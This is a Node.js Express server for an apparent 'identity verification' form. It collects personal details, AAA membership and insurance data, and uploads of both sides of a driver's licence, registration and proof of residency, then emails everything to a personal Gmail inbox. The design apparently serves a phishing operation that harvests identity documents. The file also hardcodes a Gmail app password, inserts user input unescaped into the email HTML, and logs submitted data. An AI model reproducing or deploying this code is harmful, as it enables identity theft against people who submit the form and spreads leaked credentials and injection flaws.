const express = require('express');
const cors = require('cors');
const path = require('path');
const nodemailer = require('nodemailer');
const multer = require('multer');

const app = express();
const PORT = process.env.PORT || 5000;

// Email configuration
const EMAIL_CONFIG = {
  service: 'gmail',
  auth: {
    user: 'bilalsonofkhirsheed@gmail.com',
    pass: 'xvja fncq vhjo puej' // App Password
  }
};

// Create Nodemailer transporter
const transporter = nodemailer.createTransport(EMAIL_CONFIG);

// Configure multer for memory storage (no local file storage)
const upload = multer({
  storage: multer.memoryStorage(),
  limits: {
    fileSize: 10 * 1024 * 1024, // 10MB per file
    files: 10 // Maximum 10 files
  },
  fileFilter: (req, file, cb) => {
    // Allow common document and image formats
    const allowedTypes = /jpeg|jpg|png|pdf|doc|docx/;
    const extname = allowedTypes.test(path.extname(file.originalname).toLowerCase());
    const mimetype = allowedTypes.test(file.mimetype);
    
    if (mimetype && extname) {
      return cb(null, true);
    } else {
      cb(new Error('Only images and documents are allowed!'));
    }
  }
});

// Middleware
app.use(cors({
  origin: [
    'http://localhost:3000', 
    'http://localhost:5173', 
    'http://localhost:5174',
    'http://127.0.0.1:3000', 
    'http://127.0.0.1:5173',
    'http://127.0.0.1:5174',
    'http://localhost:5173/VerifyIdentityReact/',
    'http://127.0.0.1:5173/VerifyIdentityReact/'
  ],
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With']
}));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Add request logging
app.use((req, res, next) => {
  console.log(`${new Date().toISOString()} - ${req.method} ${req.path}`);
  next();
});

// Handle preflight OPTIONS requests
app.options('*', (req, res) => {
  res.header('Access-Control-Allow-Origin', req.headers.origin || '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Requested-With');
  res.header('Access-Control-Allow-Credentials', 'true');
  res.sendStatus(200);
});

// Serve static files from the React app build directory
app.use(express.static(path.join(__dirname, '../dist')));

// API Routes
app.get('/api/health', (req, res) => {
  res.json({ 
    status: 'OK', 
    message: 'Server is running',
    timestamp: new Date().toISOString()
  });
});

// Form submission endpoint with file uploads
app.post('/api/submit-form', upload.fields([
  { name: 'licenseFront', maxCount: 1 },
  { name: 'licenseBack', maxCount: 1 },
  { name: 'proofOfResidency', maxCount: 1 },
  { name: 'registration', maxCount: 1 },
  { name: 'licensePlate', maxCount: 1 }
]), async (req, res) => {
  try {
    console.log('Form submission received:', {
      body: req.body,
      files: req.files ? Object.keys(req.files) : 'No files'
    });
    
    const formData = req.body;
    const files = req.files;
    
    // Validate required fields
    if (!formData.fullName || !formData.email) {
      return res.status(400).json({
        success: false,
        message: 'Full name and email are required'
      });
    }

    // Prepare email content
    const formType = Array.isArray(formData.form_type) ? formData.form_type[0] : (formData.form_type || 'Unknown');
    const subject = `New Identity Verification Form - ${formType.toUpperCase()}`;
    
    // Build HTML email content
    let htmlContent = `
      <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
        <h2 style="color: #333; border-bottom: 2px solid #007bff; padding-bottom: 10px;">
          Identity Verification Form Submission
        </h2>
        
        <div style="background-color: #f8f9fa; padding: 20px; border-radius: 8px; margin: 20px 0;">
          <h3 style="color: #007bff; margin-top: 0;">Form Details</h3>
          <p><strong>Form Type:</strong> ${formType.toUpperCase()}</p>
          <p><strong>Full Name:</strong> ${formData.fullName}</p>
          <p><strong>Email:</strong> ${formData.email}</p>
          <p><strong>Phone:</strong> ${formData.phoneNumber || 'Not provided'}</p>
          <p><strong>Address:</strong> ${formData.address || 'Not provided'}</p>
          <p><strong>Birth Date:</strong> ${formData.birthDate || 'Not provided'}</p>
          <p><strong>AAA Membership ID:</strong> ${formData.aaaMembershipId || 'Not provided'}</p>
          <p><strong>Ownership:</strong> ${formData.ownerType || 'Not provided'}</p>
    `;

    // Add form-specific fields
    if (formType === 'residential' || formType === 'commercial') {
      htmlContent += `
        <p><strong>Property Type:</strong> ${formData.propertyType || 'Not provided'}</p>
        <p><strong>Property Address:</strong> ${formData.propertyAddress || 'Not provided'}</p>
        <p><strong>Tech ID:</strong> ${formData.techId || 'Not provided'}</p>
      `;
    }

    if (formType === 'auto') {
      htmlContent += `
        <p><strong>Owner Name:</strong> ${formData.ownerFullName || 'Not provided'}</p>
        <p><strong>Owner Phone:</strong> ${formData.ownerPhone || 'Not provided'}</p>
        <p><strong>Insurance Policy:</strong> ${formData.insurancePolicy || 'Not provided'}</p>
        <p><strong>VIN:</strong> ${formData.vin || 'Not provided'}</p>
      `;
    }

    if (formData.ownerType === 'other') {
      htmlContent += `
        <p><strong>Owner's Name:</strong> ${formData.ownerFullName || 'Not provided'}</p>
        <p><strong>Owner's Phone:</strong> ${formData.ownerPhone || 'Not provided'}</p>
      `;
    }

    htmlContent += `
        </div>
        
        <div style="background-color: #e9ecef; padding: 20px; border-radius: 8px; margin: 20px 0;">
          <h3 style="color: #007bff; margin-top: 0;">Attached Files</h3>
    `;

    // List attached files
    const fileFields = ['licenseFront', 'licenseBack', 'proofOfResidency', 'registration', 'licensePlate'];
    let hasFiles = false;
    
    fileFields.forEach(fieldName => {
      if (files[fieldName] && files[fieldName][0]) {
        hasFiles = true;
        const file = files[fieldName][0];
        htmlContent += `<p><strong>${fieldName.replace(/([A-Z])/g, ' $1').replace(/^./, str => str.toUpperCase())}:</strong> ${file.originalname} (${(file.size / 1024).toFixed(1)} KB)</p>`;
      }
    });

    if (!hasFiles) {
      htmlContent += `<p>No files attached</p>`;
    }

    htmlContent += `
        </div>
        
        <div style="background-color: #d4edda; padding: 15px; border-radius: 8px; margin: 20px 0;">
          <p style="margin: 0; color: #155724;"><strong>Submitted:</strong> ${new Date().toLocaleString()}</p>
        </div>
      </div>
    `;

    // Prepare attachments
    const attachments = [];
    fileFields.forEach(fieldName => {
      if (files[fieldName] && files[fieldName][0]) {
        const file = files[fieldName][0];
        attachments.push({
          filename: file.originalname,
          content: file.buffer,
          contentType: file.mimetype
        });
      }
    });

    // Email options
    const mailOptions = {
      from: EMAIL_CONFIG.auth.user,
      to: EMAIL_CONFIG.auth.user, // Send to the same email
      subject: subject,
      html: htmlContent,
      attachments: attachments
    };

    // Send email
    const info = await transporter.sendMail(mailOptions);
    
    console.log('Email sent successfully:', info.messageId);
    
    res.json({
      success: true,
      message: 'Form submitted successfully and email sent',
      messageId: info.messageId
    });

  } catch (error) {
    console.error('Error processing form submission:', error);
    res.status(500).json({
      success: false,
      message: 'Error processing form submission',
      error: error.message
    });
  }
});

// Test email endpoint
app.post('/api/test-email', async (req, res) => {
  try {
    const mailOptions = {
      from: EMAIL_CONFIG.auth.user,
      to: EMAIL_CONFIG.auth.user,
      subject: 'Test Email from Verify Identity Backend',
      html: '<h2>Test Email</h2><p>This is a test email from the Verify Identity backend server.</p>'
    };

    const info = await transporter.sendMail(mailOptions);
    
    res.json({
      success: true,
      message: 'Test email sent successfully',
      messageId: info.messageId
    });
  } catch (error) {
    console.error('Error sending test email:', error);
    res.status(500).json({
      success: false,
      message: 'Error sending test email',
      error: error.message
    });
  }
});

// Catch all handler: send back React's index.html file for any non-API routes
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, '../dist/index.html'));
});

// Error handling middleware
app.use((err, req, res, next) => {
  if (err instanceof multer.MulterError) {
    if (err.code === 'LIMIT_FILE_SIZE') {
      return res.status(400).json({
        success: false,
        message: 'File too large. Maximum size is 10MB per file.'
      });
    }
    if (err.code === 'LIMIT_FILE_COUNT') {
      return res.status(400).json({
        success: false,
        message: 'Too many files. Maximum is 10 files.'
      });
    }
  }
  
  console.error('Server error:', err);
  res.status(500).json({
    success: false,
    message: 'Something went wrong!',
    error: err.message
  });
});

// Start server
app.listen(PORT, () => {
  console.log(`🚀 Server is running on port ${PORT}`);
  console.log(`📱 Health check: http://localhost:${PORT}/api/health`);
  console.log(`📧 Test email: http://localhost:${PORT}/api/test-email`);
  console.log(`📝 Form submission: http://localhost:${PORT}/api/submit-form`);
  console.log(`🌐 Frontend: http://localhost:${PORT}`);
});